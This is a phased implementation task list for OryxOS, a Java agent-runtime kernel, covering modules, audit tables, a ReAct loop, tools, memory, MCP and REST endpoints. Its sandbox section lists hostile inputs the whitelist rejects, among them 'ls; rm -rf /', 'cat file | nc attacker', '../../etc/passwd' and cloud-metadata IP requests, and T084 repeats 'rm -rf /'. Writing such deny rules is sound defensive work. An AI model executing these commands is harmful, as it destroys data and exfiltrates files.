# Tasks: OryxOS v1.0 — 企业级 Agent OS 运行时内核（核心阶段）

**Input**: Design documents from `/specs/001-oryxos-v1-core/`
**Prerequisites**: [plan.md](plan.md), [spec.md](spec.md), [research.md](research.md), [data-model.md](data-model.md), [contracts/](contracts/), [quickstart.md](quickstart.md)
**Branch**: `001-oryxos-v1-core`
**Date**: 2026-08-07

> **Tests**: 核心阶段不强制要求测试任务（constitution §3 原则 7 优先 "跑通" 而非 "完美"）。任务中穿插的"Verify X"是端到端冒烟，不写 JUnit。
>
> **路径约定**：仓库根下挂 9 个 Maven 模块（`oryxos-{core,provider,memory,tool,channel-cli,web,storage,cli,boot}/`，对应 constitution §4 + TechnicalSolution §10 锁定）。任务中的相对路径均相对仓库根。所有 Java 包名 `com.oryxos.<module>`。
>
> **⚠️ Deviation（2026-08-09）**：原 plan 假设仓库根目录为 `oryxos-os/`，9 个模块挂在 `oryxos-os/<module>/`。实际初始化（[oryxos-init skill](../../.claude/skills/oryxos-init) 实施）时仓库根为 `my-oryx-os/`，模块直接挂在 `<module>/`（无中间目录）。T001-T010 任务描述里的 `oryxos-os/<module>/` 前缀已在 2026-08-09 retrofit 移除；其余 Phase 2-8 任务天然就是 `<module>/...` 写法，与实际一致。

---

## Phase 1: Setup（Maven 9 模块骨架）

**Purpose**: 项目初始化——9 个 Maven 模块的 pom.xml 骨架 + 父 POM 聚合

- [x] T001 Create parent `pom.xml` with `<modules>` aggregation, `<dependencyManagement>` for JDK 21 + Spring Boot 3.x + Spring AI + SQLite + Picocli + SnakeYAML + MCP Java SDK, and `<pluginManagement>` for maven-compiler-plugin (release=21) + spring-boot-maven-plugin
- [x] T002 [P] Create `oryxos-core/pom.xml` (no business deps; JDK 21 only) and `oryxos-core/src/main/java/com/oryxos/core/` directory
- [x] T003 [P] Create `oryxos-provider/pom.xml` (depends on oryxos-core + Spring AI starter + Spring AI Alibaba) and `oryxos-provider/src/main/java/com/oryxos/provider/` directory
- [x] T004 [P] Create `oryxos-memory/pom.xml` (depends on oryxos-core) and `oryxos-memory/src/main/java/com/oryxos/memory/` directory
- [x] T005 [P] Create `oryxos-tool/pom.xml` (depends on oryxos-core + MCP Java SDK) and `oryxos-tool/src/main/java/com/oryxos/tool/{builtin,mcp}/` directory
- [x] T006 [P] Create `oryxos-channel-cli/pom.xml` (depends on oryxos-core) and `oryxos-channel-cli/src/main/java/com/oryxos/channel/cli/` directory
- [x] T007 [P] Create `oryxos-web/pom.xml` (depends on oryxos-core + Spring Web MVC) and `oryxos-web/src/main/java/com/oryxos/web/controller/` directory
- [x] T008 [P] Create `oryxos-storage/pom.xml` (depends on oryxos-core + Spring Data JPA + SQLite JDBC) and `oryxos-storage/src/main/java/com/oryxos/storage/entity/` directory
- [x] T009 [P] Create `oryxos-cli/pom.xml` (depends on oryxos-core + Picocli) and `oryxos-cli/src/main/java/com/oryxos/cli/` directory
- [x] T010 [P] Create `oryxos-boot/pom.xml` (depends on ALL other modules; spring-boot-maven-plugin repackage) and `oryxos-boot/src/main/java/com/oryxos/boot/` directory
- [x] T011 Create `.gitignore` at repo root (target/, .idea/, *.iml, .oryxos/oryxos.db, .oryxos/logs/) and run `git init` + initial commit `feat: initialize OryxOS 9-module Maven skeleton (pre-alpha)`

**Checkpoint**: 9 个模块骨架就位；`mvn validate` 通过；模块依赖图严格按 plan.md §Project Structure 锁定。

---

## Phase 2: Foundational（核心抽象 + 持久化层）

**Purpose**: 阻塞所有 US 的基础设施——`OryxTool` 接口 + 6 个 JPA 实体 + 加载器 + 主类

**⚠️ CRITICAL**: 5 个 US 全部依赖本阶段产出

- [x] T012 [P] Define `oryxos-core/.../OryxTool.java` interface — `String name()`, `String description()`, `JsonNode inputSchema()`, `Object execute(Profile profile, JsonNode input)` (FR-026)
- [x] T013 [P] Define `oryxos-core/.../Profile.java` immutable record — `name`, `ProviderConfig provider`, `List<String> tools`, `List<String> mcpServers`, `List<String> schedules`, `Settings settings`, `String systemPrompt` (FR-001)
- [x] T014 [P] Define `oryxos-core/.../Session.java` in-memory model — `sessionId`, `profileName`, `channel`, `userId`, `List<Message> messages`, `SessionStatus status`, `Instant createdAt`, `Instant lastActiveAt`
- [x] T015 [P] Create `oryxos-storage/.../entity/SessionEntity.java` + `SessionRepository.java` (JpaRepository) for `sessions` table (FR-009/047, data-model.md §4)
- [x] T016 [P] Create `oryxos-storage/.../entity/ToolInvocationEntity.java` + `ToolInvocationRepository.java` for `tool_invocations` table (FR-044/046, data-model.md §5) — 字段含 `rejection_reason VARCHAR(64) NULL`（T042 Sandbox 拒绝时写入，配套 FR-056 fail-closed）
- [x] T017 [P] Create `oryxos-storage/.../entity/LlmCallEntity.java` + `LlmCallRepository.java` for `llm_calls` table (FR-045/046, data-model.md §6)
- [x] T018 [P] Create `oryxos-storage/.../entity/ScheduledTaskEntity.java` + `ScheduledTaskRepository.java` for `scheduled_tasks` table (FR-014/048, data-model.md §7)
- [x] T019 [P] Create `oryxos-storage/.../entity/TaskExecutionEntity.java` + `TaskExecutionRepository.java` for `task_executions` table (FR-048, data-model.md §8)
- [x] T020 [P] Create `oryxos-storage/.../entity/NotifyChannelEntity.java` + `NotifyChannelRepository.java` for `notify_channels` table (FR-026 通知渠道数据层, data-model.md §9)
- [x] T021 Create `oryxos-storage/src/main/resources/application-storage.yml` — Spring Data JPA + SQLite config (datasource url=jdbc:sqlite:${ORYXOS_HOME}/oryxos.db; ddl-auto=update; show-sql=false)
- [x] T022 [P] Create `oryxos-core/.../ContextLoader.java` — load `.oryxos/{AGENTS.md,SOUL.md,USER.md}` based on Profile's `bootstrap` field (FR-004)
- [x] T023 [P] Create `oryxos-core/.../AgentLoader.java` — scan `.oryxos/agents/<name>/AGENT.md`, parse YAML frontmatter with SnakeYAML, return `Map<String, Profile>` (FR-001)
- [x] T024 [P] Create `oryxos-core/.../ProfileContext.java` — ThreadLocal<String> holding current Profile name during virtual thread execution; `currentProfile()` / `set()` / `clear()`
- [x] T025 Create `oryxos-boot/src/main/resources/application.yml` — root config: `spring.ai.tool.execution.enabled=false`, `spring.ai.model.tool-calling.auto=false` (⚠️ constitution §3 原则 4 关键禁用项), `spring.threads.virtual.enabled=true`, logging.level.com.oryxos=DEBUG
- [x] T026 Create `oryxos-boot/.../OryxOsApplication.java` — `@SpringBootApplication(scanBasePackages="com.oryxos")` with `main(String[] args)` calling `SpringApplication.run()`
- [x] T027 [P] Create `oryxos-cli/.../ConfigLoader.java` — load `oryxos.yaml` (path override, port override) + `${ENV_VAR}` placeholder substitution (FR-041/SC-011)
- [x] T028 [P] Create `oryxos-cli/.../InitCommand.java` — Picocli `@Command(name="init")` generating `.oryxos/{AGENTS.md,SOUL.md,USER.md,agents/example/,skills/,memory/MEMORY.md,mcp_servers.yaml}` (cli-commands.md §1)

**Checkpoint**: 9 个模块编译通过；`mvn -pl oryxos-boot package` 能产出 fat JAR；`java -jar oryxos.jar init` 能初始化工作区骨架。

---

## Phase 3: User Story 1 — LLM Provider 抽象 (Priority: P1) 🎯 MVP

**Goal**: 通过修改 Profile 的 `provider.name` + 重启切换 LLM；每次 LLM 调用落 `llm_calls` 表

**Independent Test**: 用 minimax Provider 跑通一次完整对话；切换 Provider 字段重启后对话仍能完成（FR-001/002/008/011）

- [x] T029 [P] [US-1] Create `oryxos-provider/.../ChatModel.java` interface — `LlmResponse call(LlmRequest request)` wrapping Spring AI `ChatModel` interface (abstracting Spring AI dependency out of oryxos-core)
- [x] T030 [P] [US-1] Create `oryxos-provider/.../ProviderRegistry.java` — explicit `Map<String, ChatModel>` populated from `application.yml` `oryxos.providers.*` (no classpath scanning, FR-008/011 + research D5)
- [x] T031 [US-1] Create `oryxos-provider/.../ProviderService.java` — `LlmResponse call(Profile profile, Prompt prompt, String sessionId)`: looks up ChatModel via `ProviderRegistry`, invokes `ChatModel.call()`, writes `llm_calls` row **before** returning (FR-012/045/046). The `sessionId` parameter is mandatory for FR-046 audit attribution — `null`/blank skips persistence (CLI probe path)
- [x] T032 [US-1] Add `oryxos.providers.minimax` config block to `oryxos-boot/src/main/resources/application.yml` — `api-key: ${MINIMAX_API_KEY}`, `base-url: https://api.minimaxi.com/anthropic`, `model: MiniMax-M3` (quickstart.md §前置准备)
- [x] T033 [US-1] Create `oryxos-core/.../PromptBuilder.java` — `Prompt build(Profile profile, List<Message> history, List<OryxTool<?, ?>> tools)` returning assembled system + history + `Prompt` record. Internally extracts each tool's `inputSchema()` and `name()` into **parallel arrays** (`toolSchemas` + `toolNames`) on the returned `Prompt` record, preserving LLM tool-call schema-index → name resolution order (FR-003~005).
- [x] T034 [P] [US-1] Create `oryxos-cli/.../{ProviderCommand,ProviderListCommand,ProviderTestCommand}.java` — Picocli parent + 2 subcommands (`list` and `test <name>`). `test` calls `ProviderService.call()` with a 1-token prompt (cli-commands.md §6). Plus **`SpringCommandFactory` bridge** in `oryxos-cli/.../SpringCommandFactory.java` — Picocli↔Spring bean resolution so subcommand `@Component` constructor injection works
- [x] T035 [US-1] **Verify US-1**: run `java -jar oryxos.jar provider list` → ✅ lists `minimax`; `provider test minimax` (without API key) → clear "unconfigured" error. **Real FR-011 (cross-provider switch test) deferred** — requires a 2nd provider bean in `oryxos.providers.*`; revisit when MCP / 2nd provider lands in Phase 5

**Checkpoint**: US-1 完全可用；Provider 抽象 + 显式映射 + llm_calls 落库 全部就绪；可作为 MVP 单独交付。

---

## Phase 4: User Story 2 — ReAct 循环 (Priority: P2)

**Goal**: Agent 自主决定调用 Tool；三入口（CLI / Web / Cron）统一走 `AgentService.process()`；`tool_invocations` 落库

**Independent Test**: CLI 多轮对话中 Agent 自主完成 http_get 工具调用；同一 Agent 走 Web API 也得到一致结果；Tool 审计可在 SQLite 中查到（FR-006/013~017/022/037/044）

### 内建 Tool（FR-026）

- [x] T036 [P] [US2] Create `oryxos-tool/.../builtin/ReadFileTool.java` — reads file path (sandbox-validated); implements `OryxTool`
- [x] T037 [P] [US2] Create `oryxos-tool/.../builtin/WriteFileTool.java` — writes content to file path (sandbox-validated)
- [x] T038 [P] [US2] Create `oryxos-tool/.../builtin/ListDirTool.java` — lists directory entries (sandbox-validated)
- [x] T039 [P] [US2] Create `oryxos-tool/.../builtin/ShellTool.java` — executes shell command (sandbox-validated; FR-021)
- [x] T040 [P] [US2] Create `oryxos-tool/.../builtin/HttpTool.java` — `http_get` + `http_post` as 2 OryxTool entries (FR-026)

### Sandbox 安全（FR-021/027/SC-012 + FR-056 fail-closed）

> **📌 T041/T042 实现必读**（来自 [checklists/security.md](checklists/security.md) 6 个高影响 gap 中的 4 个已就地解析，#5 fail-closed 已升 FR-056，#4 SSRF 已划入 §Out of Scope 延后扩展阶段）：
>
> **T041 — Sandbox 接口**
> - `validate(ToolInvocation)` 必须抛 `SandboxDeniedException`，由 ToolExecutor 捕获后写 `tool_invocations.rejection_reason` + 失败状态（**不**抛回 ReAct 循环导致整个 Agent 中断，见 FR-056 fail-closed）
> - 三类白名单共用一个接口，按 invocation.toolName 分派到对应 matcher
>
> **T042 — WhitelistSandbox 三类匹配算法（必须按以下语义实现，不留歧义）**
>
> | 白名单 | 匹配算法 | 拒绝示例 |
> |--------|---------|---------|
> | **路径**（path） | `Path.toRealPath()`（symlink 解析）+ `Path.normalize()` → 前缀匹配 `${ORYXOS_HOME}/**` 与配置的 `oryxos.sandbox.file.allowed-paths`；Linux 大小写敏感、Windows 大小写不敏感（用 `FileSystem.getFileSystem().getPath(...).compareTo` 或 `PathString.startsWith` 视平台） | `../../etc/passwd` → 拒绝；symlink 指 `${ORYXOS_HOME}/a` → 指向 `/etc` → 拒绝 |
> | **Shell**（shell） | `argv[0]` basename 匹配白名单 `ls/cat/grep/awk/sed/find/echo/python/node` + **先 regex 黑名单** `.*[;|&$()<>\`\n\r].*` 整 cmd 拒绝；任何含 shell metacharacter 的输入直接拒绝（即使 basename 在白名单） | `ls; rm -rf /` → 黑名单命中拒绝；`cat file \| nc attacker` → 黑名单命中拒绝 |
> | **HTTP**（http） | `URI.getScheme()` 必须是 `http` 或 `https`（`file:` / `gopher:` / `jar:` 拒绝） + `URI.getHost()` 精确或后缀匹配（`*.example.com` 允许 `api.example.com`）；**IP literal 必须拒绝**（用 `InetAddress.isLiteral()` 判定后拒绝，避免 `http://127.0.0.1` / `http://169.254.169.254` 走域名 matcher 绕开） | `http://127.0.0.1` → IP literal 拒绝；`file:///etc/passwd` → scheme 拒绝；`http://api.example.com` 在 `*.example.com` 白名单 → 允许 |
>
> **FR-056 fail-closed 强制约束**：任何"白名单为空且无默认值"或"配置解析异常"→ 拒绝（**不**放行）；返回 `error.code = "sandbox_denied"` + `rejection_reason` 字段（如 `"path_not_whitelisted"` / `"shell_metachar"` / `"ip_literal_denied"` / `"whitelist_empty"`）
>
> **T042 附加项：审计字段**
> - `ToolInvocationEntity.rejection_reason` (nullable VARCHAR(64))：记录被 Sandbox 拒绝的原因 code（成功调用时为 NULL）
> - 与 `tool_invocations.success=false` 配合，构成"拒绝也有完整审计"的 FR-056 闭环（参见 [data-model.md §5](data-model.md)）

- [x] T041 [P] [US2] Create `oryxos-tool/.../Sandbox.java` interface — `void validate(ToolInvocation invocation)` throws `SandboxDeniedException`（细节见上 T041 注释：与 FR-056 配套）
- [x] T042 [P] [US2] Create `oryxos-tool/.../WhitelistSandbox.java` impl — 严格按上表三列算法实现 path/shell/http 白名单；含 `ToolInvocationEntity.rejection_reason` 字段写入逻辑（research D12 + FR-056）

### Tool 注册 + 执行

- [x] T043 [US2] Create `oryxos-tool/.../ToolRegistry.java` — `register(OryxTool tool)` / `get(String name)` / `list()`; designed to support 3 sources (builtin / annotation / mcp) without API change (FR-031, US-4 will extend)
- [x] T044 [P] [US2] Create `oryxos-tool/.../OryxToolBeans.java` `@Configuration` — register all 6 builtin Tools as Spring beans via `@Bean` methods; bind WhitelistSandbox as primary Sandbox bean (FR-031)
- [x] T045 [US2] Create `oryxos-tool/.../ToolExecutor.java` — `ToolResult execute(Profile profile, ToolCall call)`: looks up Tool from registry → validates via Sandbox → invokes execute() → writes `tool_invocations` row before returning (FR-022/044/046)

### ReAct 核心

- [x] T046 [P] [US2] Create `oryxos-core/.../ReActLoop.java` — self-implemented ~30 lines; `while (iteration < settings.maxIterations) { LlmResponse resp = providerService.call(...); if (!resp.hasToolCalls()) return resp; for (ToolCall c : resp.toolCalls()) toolExecutor.execute(profile, c); iteration++; }` (FR-013~017 + research D4)
- [x] T047 [US2] Create `oryxos-core/.../AgentService.java` — `AgentResponse process(Profile profile, String message, Session session)`: manage session lifecycle + delegate to ReActLoop; this is the single entry used by 3 triggers (FR-037)
- [x] T048 [P] [US2] Create `oryxos-core/.../AgentScheduler.java` — Spring `@Component` scanning `scheduled_tasks` table; cron parsing via cron-utils; non-blocking retry with backoff 30s/2min/8min on failure (FR-014~017/048 + research D13)；3 次重试仍失败时通过 `NotifyChannelAdapter` 发告警 + 写 `task_executions.notified=true`（**不**阻塞下一次周期 cron 触发）

### CLI Channel + Picocli 入口

- [x] T049 [P] [US2] Create `oryxos-channel-cli/.../CliChannel.java` — multi-turn REPL using virtual thread; prompts `[agent-name] > `; built-in commands `/exit` `/memory` `/clear` (FR-006/007)
- [x] T050 [P] [US2] Create `oryxos-cli/.../ChatCommand.java` — Picocli `@Command(name="chat")` invoking CliChannel with `<agent>` arg (cli-commands.md §2)
- [x] T051 [P] [US2] Create `oryxos-cli/.../ServeCommand.java` — Picocli `@Command(name="serve")` starting SpringApplication with `--port` / `--host` options (cli-commands.md §3)
- [x] T052 [P] [US2] Create `oryxos-cli/.../GatewayCommand.java` — Picocli `@Command(name="gateway")` starting AgentScheduler only (no web) (cli-commands.md §4)
- [x] T053 [US2] **Verify US-2**: run `java -jar oryxos.jar chat daily-weather`; input "杭州今天天气怎么样？" → Agent calls http_get Tool → returns weather; `sqlite3 oryxos.db "SELECT * FROM tool_invocations ORDER BY id DESC LIMIT 2"` shows 1 row; `gateway` starts scheduler and fires cron at next minute

**Checkpoint**: US-2 完全可用；Demo 一的前置条件全部就绪；可在 CLI 完成多轮 Tool 调用 + 审计可查。

---

## Phase 5: User Story 3 — Memory 三层记忆 (Priority: P3)

**Goal**: Agent 启动时 MEMORY.md 注入 system prompt；`save_memory` / `recall_memory` Tool 跨 Session 保留偏好；24h 无活动 Session 自动归档

**Independent Test**: Session A 中 `save_memory("偏好简洁回复")`；新 Session B 启动后 system prompt 已包含该偏好；MEMORY.md 超 4000 字按 LRU 整段截断（FR-018~020/023/024/047）

- [x] T054 [P] [US3] Create `oryxos-memory/.../LongTermMemory.java` — reads/writes `.oryxos/memory/MEMORY.md` with two sections (`## 核心记忆` / `## 归档记忆`); pure file IO with synchronized writes (FR-018/019)
- [x] T055 [US3] Implement LRU truncation in `LongTermMemory.java` — when total > 4000 chars, preserve `## 核心记忆` full + drop oldest entries from `## 归档记忆` by Markdown header (H1/H2) atomic chunks (FR-024 + clarify Q1 answer B)
- [x] T056 [P] [US3] Create `oryxos-memory/.../MemoryService.java` facade — `void add(String content)`, `List<String> recall(String query)`, `String getContextForPrompt()`; delegates to LongTermMemory for persistence layer (FR-018~020 + research D6)
- [x] T057 [P] [US3] Create `oryxos-memory/.../MemoryTools.java` exposing `save_memory` and `recall_memory` as OryxTool implementations (registered via ToolRegistry, FR-020)
- [x] T058 [US3] Modify `oryxos-core/.../PromptBuilder.java` to inject `MemoryService.getContextForPrompt()` into system prompt at agent startup (FR-023)
- [x] T059 [US3] Create `oryxos-storage/.../SessionArchiveTask.java` — `@Scheduled` background task running hourly; archive sessions where `lastActiveAt < now - 24h` (FR-047); 同时确保归档后 Session 仍可按 ID 查询（`SessionRepository.findById` 不被 status 过滤）
- [x] T060 [P] [US3] Create `oryxos-cli/.../MemoryCommand.java` — Picocli subcommand group with `show` / `add <text>` / `clear --confirm` (cli-commands.md §9)
- [x] T061 [P] [US3] Modify `oryxos-cli/.../SessionCommand.java` — add `list` / `show <id>` / `archive <id>` (cli-commands.md §8)
- [x] T062 [US3] **Verify US-3**: in chat `tech-daily` say "我只想看 AI 新闻" → save_memory called → exit; restart chat → system prompt already contains "只看 AI 新闻" preference; check MEMORY.md file has 2 sections; manually grow file > 4000 chars → confirm core section preserved, archive LRU dropped

**Checkpoint**: US-3 完全可用；Demo 二的前置条件（Memory）就绪；24h Session 自动归档生效。

---

## Phase 6: User Story 4 — Plugin Tool 体系 (Priority: P3)

**Goal**: 内建 Tool / `@Tool` 注解 / MCP 三档来源全部包装为 OryxTool；MCP 启动行为可控；Skill 渐进披露 L1/L2；Notify 渠道接入

**Independent Test**: 配置一个 stdio MCP server → 重启 → 该 MCP server 的 Tool 出现在 `tool list` 中；Agent 能调用；Skill 元数据在启动时注入，正文按需 read_file 加载（FR-026/029/030/032/034/049）

- [x] T063 [P] [US4] Create `oryxos-tool/.../mcp/McpClientService.java` — Spring `@Component`; reads `.oryxos/mcp_servers.yaml`; for each server, attempts stdio connection with 3s timeout on startup; logs warning + skips on failure (FR-030/049 + research D7)；**call-time 重连节奏**由实现层决定（与 FR-049 一致），单次重连超时 MUST ≤ 5 秒；重试 1 次仍持续失败由 FR-053 触发 502 `mcp_unavailable` 响应
- [x] T064 [P] [US4] Create `oryxos-tool/.../mcp/McpToolAdapter.java` — wraps MCP `Tool` as OryxTool; tool name prefixed with `mcp:<server>:<tool>` to avoid collision (FR-032)
- [x] T065 [US4] Modify `oryxos-tool/.../ToolRegistry.java` to auto-register McpToolAdapter results on startup; registry remains source-agnostic (FR-031/032)
- [x] T066 [P] [US4] Create `oryxos-tool/.../notify/NotifyChannelAdapter.java` interface — `String name()`, `void send(String payload)`, `ChannelType type()`
- [x] T067 [P] [US4] Create `oryxos-tool/.../notify/WebhookNotifyAdapter.java` impl — POST JSON to configured webhook URL with timeout/retry
- [x] T068 [P] [US4] Create `oryxos-tool/.../builtin/NotifyTools.java` exposing `notify_slack` and `notify_webhook` as OryxTool entries (FR-026 通知 Tool 部分)
- [x] T069 [P] [US4] Modify `oryxos-tool/.../OryxToolBeans.java` to register NotifyChannelAdapter beans from `notify_channels` table on startup (FR-026 通知渠道注册表装配)
- [x] T070 [US4] Modify `oryxos-core/.../ContextLoader.java` to also scan Agent's `skills/<name>/` symlinks and inject L1 metadata (name + description) into system prompt (FR-029)
- [x] T071 [US4] Verify Skill L2 disclosure via existing `ReadFileTool` — Agent reads SKILL.md body on demand via `read_file` Tool when explicitly needed (FR-029, no new code beyond T036)
- [x] T072 [P] [US4] Create `oryxos-cli/.../ToolCommand.java` — Picocli `@Command(name="tool")` with `list` subcommand showing source (builtin / annotation / mcp) (cli-commands.md §7)
- [x] T073 [US4] **Verify US-4**: configure hacker-news MCP in `mcp_servers.yaml` → `tool list` shows `mcp:hacker-news-mcp:get_stories` etc; chat tech-daily → Agent invokes MCP tool → real data returned; Skill L1 metadata in system prompt log; Skill body only loaded on first read_file call

**Checkpoint**: US-4 完全可用；Demo 二前置（Plugin Tool MCP）+ Skill L1/L2 全部就绪；Notify 渠道可用。

---

## Phase 7: User Story 5 — Web Service (Priority: P4)

**Goal**: 10 个 REST 端点全部可调；3 个 Demo 全跑通

**Independent Test**: 启动 `serve` 后所有 10 个端点返回正确响应；3 个 Demo 端到端可复现（quickstart.md §Demo 1/2/3）

> **📌 DEFER(2026-08-14 speckit.analyze C1)**:FR-038「API MUST 支持 HTTPS」在本阶段 **不实施**,理由见 `spec.md` §Out of Scope HTTPS / TLS 条目。Phase 7 交付的 12 个端点都是 HTTP；TLS 终止依赖反向代理。扩展阶段再做。

- [x] T074 [P] [US5] Create `oryxos-web/.../controller/SessionController.java` — `POST /api/v1/sessions`, `POST /api/v1/sessions/{id}/messages`, `GET /api/v1/sessions/{id}`, `DELETE /api/v1/sessions/{id}` (4 endpoints; FR-036, rest-api.yaml §Session)
- [x] T075 [P] [US5] Create `oryxos-web/.../controller/AgentController.java` — `POST /api/v1/agents/{name}/invoke` (1 endpoint; FR-036)
- [x] T076 [P] [US5] Create `oryxos-web/.../controller/ProfileController.java` — `GET /api/v1/profiles` listing all loaded Profiles (1 endpoint; FR-036)
- [x] T077 [P] [US5] Create `oryxos-web/.../controller/MemoryController.java` — `GET /api/v1/memory` returning MemoryContent (2 sections + total chars) (1 endpoint; FR-036)
- [x] T078 [P] [US5] Create `oryxos-web/.../controller/ToolController.java` — `GET /api/v1/tools` listing all registered Tools (1 endpoint; FR-036)
- [x] T079 [P] [US5] Create `oryxos-web/.../controller/SystemController.java` — `GET /api/v1/health` + `GET /api/v1/info` (2 endpoints; FR-036)
- [x] T080 [P] [US5] Create `oryxos-web/.../WebServer.java` — `@Configuration` registering all 6 controllers + virtual thread executor; OpenAPI bean
- [x] T081 [US5] Create `oryxos-web/.../GlobalExceptionHandler.java` — `@RestControllerAdvice` mapping `OryxException` / `AgentNotFoundException` / `SandboxDeniedException` to structured `ErrorResponse` JSON (rest-api.yaml §ErrorResponse)
- [x] T082 [US5] **Verify US-5 (Demo 一)**: `serve` → curl all 10 endpoints return 2xx; chat daily-weather via Web API gets weather response + Tool audit row; gateway triggers daily-weather at scheduled minute + Slack webhook receives notification

### API 完备性（FR-050 / FR-051 / FR-052 / FR-053 落地）

> **📌 本段补 FR-050~053 的 task 实现**（来自 [analyze-report-2026-08-07.md E3](checklists/analyze-report-2026-08-07.md)："api.md 补的 6 项 FR-050~055 在 tasks.md 中没有对应 task"——FR-054/055 是行为约束已散落到 T058/T079，本段专门补 FR-050/051/052/053 的实现 task）

- [x] T082a [P] [US5] Create `oryxos-web/.../controller/AuditController.java` — `GET /api/v1/audit/tool?sessionId=&from=&to=&limit=` + `GET /api/v1/audit/llm?sessionId=&from=&to=&limit=`；查询 `tool_invocations` / `llm_calls` 表，按时间倒序；响应含 `tool_name` / `provider` / `input_summary`（脱敏）/ `result_summary` / `token` / `duration_ms` / `rejection_reason`（如适用）（FR-050，对应 SC-014）
- [x] T082b [US5] Modify `oryxos-web/.../controller/SessionController.java` + `AgentController.java` — 在 `POST /api/v1/sessions/{id}/messages` 与 `POST /api/v1/agents/{name}/invoke` 路径上叠加 60 秒超时控制（可被 `X-Oryxos-Timeout-Ms` header override，默认 60000ms）；超时触发 408 响应 + body 含已落审计的中间 Tool 调用列表（FR-051）
- [x] T082c [US5] Modify `oryxos-web/.../controller/AgentController.java` — 在 Spring `ApplicationReadyEvent` 之前（Agent 注册未就绪时）的 `/agents/{name}/invoke` 请求 MUST 返回 503 + `Retry-After: 5` 头；用 `BeanPostProcessor` / `ApplicationListener<ApplicationStartingEvent>` 跟踪 ready 标志（FR-052）
- [x] T082d [US5] Modify `oryxos-web/.../controller/SessionController.java` + `AgentController.java` — 调用 MCP Tool 时若 McpClientService 报"持续不可达"（FR-049 重试 1 次仍失败），抛 `McpUnavailableException` 由 `GlobalExceptionHandler` 映射为 502 + `error.code = "mcp_unavailable"`（FR-053）
- [x] T083 [US5] **Verify US-5 (Demo 二)**: chat tech-daily via Web API; recall_memory shows preference from prior session; tool list shows MCP + Skill L1 metadata; cron at 9am triggers Hacker News digest via MCP + Slack notify
- [x] T084 [US5] **Verify US-5 (Demo 三)**: chat github-daily; shell Tool runs `scripts/github_trending.py python`; Sandbox rejects unauthorized commands (`rm -rf /`); Slack receives top 10 trending with stars

**Checkpoint**: 5 个 US 全部完成；3 个 Demo 端到端跑通；可发版。

---

## Phase 8: Polish & Cross-Cutting Concerns

**Purpose**: 横切关注点——日志、文档、一致性检查、最终验收

- [x] T085 [P] Configure structured JSON logging in `oryxos-boot/src/main/resources/logback-spring.xml` — Logback JSON encoder; `.oryxos/logs/oryxos.log` rolling daily (research §logging)
- [x] T086 [P] Add unit tests in `oryxos-memory/src/test/java/.../LongTermMemoryTest.java` — cover LRU truncation strategy (3 cases: under limit / over by archive-only / over by core section)
- [x] T087 [P] Add unit tests in `oryxos-tool/src/test/java/.../WhitelistSandboxTest.java` — cover allowed/denied path/command/domain (3 cases each)
- [x] T088 [P] Add unit tests in `oryxos-core/src/test/java/.../ReActLoopTest.java` — mock ProviderService + ToolExecutor; verify loop exits on no tool_calls, exits on max_iterations
- [x] T089 Create `README.md` at repo root — quick start, 3 Demo commands, architecture diagram, links to docs/ + specs/
- [x] T090 Run `/speckit.analyze` to verify spec.md ↔ plan.md ↔ tasks.md consistency; address any flagged drift
- [x] T091 Run quickstart.md validation end-to-end (3 Demos); update quickstart.md with any gap discovered
- [ ] T092 Final git commit `feat: complete OryxOS v1.0 core phase` + tag `v1.0.0-core`

**Checkpoint**: 核心阶段全部完成；constitution §3 7 条原则 + 8 条偏离纠错清单自检通过；可进入扩展阶段。

---

## Dependencies & Execution Order

### Phase Dependencies

- **Phase 1 (Setup)**: 无依赖——可立即开始
- **Phase 2 (Foundational)**: 依赖 Phase 1 完成——**阻塞所有 US**
- **Phase 3 (US-1)**: 依赖 Phase 2 完成——可单独跑通（MVP）
- **Phase 4 (US-2)**: 依赖 Phase 3 完成
- **Phase 5 (US-3)**: 依赖 Phase 4 完成
- **Phase 6 (US-4)**: 依赖 Phase 4 完成（与 US-3 并行）
- **Phase 7 (US-5)**: 依赖 Phase 5 + Phase 6 都完成
- **Phase 8 (Polish)**: 依赖 Phase 7 完成

### User Story Dependencies

- **US-1 (P1)**: Phase 2 后可启动——无其他 US 依赖
- **US-2 (P2)**: 依赖 US-1 的 ProviderService（ReAct 需要能调 LLM）
- **US-3 (P3)**: 依赖 US-2 的 ReActLoop + ToolExecutor（Memory Tool 是 Tool 之一）
- **US-4 (P3)**: 依赖 US-2 的 ToolRegistry + ToolExecutor（三档 Tool 都进同一注册表）
- **US-5 (P4)**: 依赖 US-1~4 全部就绪（Web 是门面，复用前面所有能力）

### Parallel Opportunities

- Phase 1 中 T002-T010 的 9 个 module pom 可**并行**
- Phase 2 中 T015-T020 的 6 个 JPA entity 可**并行**
- Phase 2 中 T022-T024 的 3 个 core loader / context 可**并行**
- Phase 4 中 T036-T040 的 5 个内建 Tool 可**并行**
- Phase 4 中 T041-T042 的 Sandbox 接口 + 实现 可**并行**
- US-3（Phase 5）和 US-4（Phase 6）可**并行**开发（都依赖 US-2 完成）
- Phase 8 中 T085-T088 的日志 + 测试 可**并行**

---

## Parallel Example: US-2 内建 Tools

```bash
# 启动 5 个内建 Tool 实现并发任务（不同文件，无依赖）
Task T036: "Create oryxos-tool/.../builtin/ReadFileTool.java"
Task T037: "Create oryxos-tool/.../builtin/WriteFileTool.java"
Task T038: "Create oryxos-tool/.../builtin/ListDirTool.java"
Task T039: "Create oryxos-tool/.../builtin/ShellTool.java"
Task T040: "Create oryxos-tool/.../builtin/HttpTool.java"
```

## Parallel Example: US-3 与 US-4

```bash
# US-3 (Memory) 和 US-4 (Plugin Tool) 都依赖 US-2 完成；之后并行
# Developer A: Phase 5 tasks T054-T062 (US-3)
# Developer B: Phase 6 tasks T063-T073 (US-4)
# Both merge independently → US-5 unblocks
```

---

## Implementation Strategy

### MVP First（仅 US-1）

1. ✅ 完成 Phase 1: Setup（11 tasks）
2. ✅ 完成 Phase 2: Foundational（17 tasks）
3. ✅ 完成 Phase 3: US-1（7 tasks，35 总）
5. 🛑 **STOP and VALIDATE**: `provider test minimax` 通过；LLM 调用成功落 `llm_calls` 表
6. → MVP 验证完成，可独立发布 Provider 抽象能力

> 说明：US-1 自身**没有独立 Demo**（per [plan.md §5 US 实现路径概要](plan.md)："无独立 Demo，跟 US-2 一起"）。MVP 实际上是 **Phase 1 + 2 + US-1 + US-2 全部**——即"CLI 多轮 Tool 调用 + 审计可查"，即 Demo 一的前置阶段。

### Incremental Delivery（推荐）

按"每 US 完成立刻跑对应 Demo"原则：

1. ✅ Phase 1: Setup → Maven 骨架就位
2. ✅ Phase 2: Foundational → 基础设施就位
